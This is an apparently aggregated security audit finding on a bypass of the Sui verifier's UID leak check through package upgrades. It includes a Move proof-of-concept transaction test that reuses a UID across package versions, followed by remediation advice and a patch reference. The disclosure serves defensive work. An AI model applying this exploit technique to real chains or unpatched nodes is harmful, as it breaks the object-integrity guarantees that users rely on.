---
# Core Classification
protocol: Mysten Labs Sui
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 48090
audit_firm: OtterSec
contest_link: https://mystenlabs.com/
source_link: https://mystenlabs.com/
github_link: https://github.com/MystenLabs/sui

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 5
finders:
  - Cauê Obici
  - Michal Bochnak
  - James Wang
  - Robert Chen
  - OtterSec
---

## Vulnerability Title

Bypass Id Leak Verifier

### Overview


The report discusses a bug in the id_leak_verifier function of the sui-verifier, which is responsible for ensuring that unique identifiers (UIDs) for Sui Objects are not reused. However, it has been found that this check can be bypassed using the unique Sui upgrade model. This is due to the ability to add new capabilities during an upgrade, the verifier not validating structures without a Key capability, and objects being passed between different versions of the same package. A proof of concept is provided, along with a suggested fix and a patch that has been implemented to address the issue.

### Original Finding Content

## Sui Verifier: UID Non-Reusability

The `id_leak_verifier` in Sui Verifier ensures the non-reusability of a UID for the Sui Object. This step of the verifier guarantees that the `id` field of Sui objects never becomes leaked. However, a bypass of these checks may occur utilizing the unique Sui upgrade model. This issue arises due to the following factors:

1. It is possible to add abilities during an upgrade.
2. The verifier does not validate structures without a Key capability.
3. It is possible to pass objects between different versions of the same package.

## Proof of Concept

The provided file describes the issue through a Sui transaction test. The scenario is as follows:

1. Publish a module containing the `Bar` type without a Key capability, allowing the code to pack this type from any UID.
2. Upgrade the module, giving the `Bar` type a Key capability, while removing the Pack instruction from the code.
3. Construct a `Bar` instance using a reused UID with the old version of the module, and then pass it into the new version.
4. Notice that the last operation executes without any errors.

### PoC.move

```rust
// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0
//# init --addresses Test_V0=0x0 Test_V1=0x0 --accounts A
//# publish --upgradeable --sender A
module Test_V0::base {
    use sui::object;
    use sui::object::UID;
    use sui::tx_context::TxContext;

    // no key yet
    struct Foo {
        id: UID,
    }

    // no key yet
    struct Bar {
        id: UID,
    }

    public fun build_foo(ctx: &mut TxContext): Foo {
        Foo {
            id: object::new(ctx),
        }
    }

    // works fine because Foo doesn't have key ability
    public fun build_bar_from_foo(foo: Foo): Bar {
        let Foo { id } = foo;
        Bar {
            id: id,
        }
    }
}
//# upgrade --package Test_V0 --upgrade-capability 1,1 --sender A
module Test_V1::base {
    use sui::object::UID;
    use sui::object;
    use sui::tx_context::TxContext;

    // has key which means it should be checked by id_leak_verifier
    struct Foo has key {
        id: UID,
    }

    // has key which means it should be checked by id_leak_verifier
    struct Bar has key {
        id: UID,
    }

    public fun build_foo(ctx: &mut TxContext): Foo {
        Foo {
            id: object::new(ctx),
        }
    }

    public fun build_bar_from_foo(_foo: Foo): Bar {
        // remove the violating instructions
        abort 42
    }

    public fun take_bar(bar: Bar) {
        let Bar {id} = bar;
        object::delete(id);
    }
}
//# programmable --sender A
//> 0: Test_V1::base::build_foo();
//> 1: Test_V0::base::build_bar_from_foo(Result(0));
//> 2: Test_V1::base::take_bar(Result(1));
```

## Remediation

Introduce a new check during the upgrade mechanism to avoid adding a Key capability to an object.

## Patch

Fixed in `cbea73e`.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | OtterSec |
| Protocol | Mysten Labs Sui |
| Report Date | N/A |
| Finders | Cauê Obici, Michal Bochnak, James Wang, Robert Chen, OtterSec |

### Source Links

- **Source**: https://mystenlabs.com/
- **GitHub**: https://github.com/MystenLabs/sui
- **Contest**: https://mystenlabs.com/

### Keywords for Search

`vulnerability`

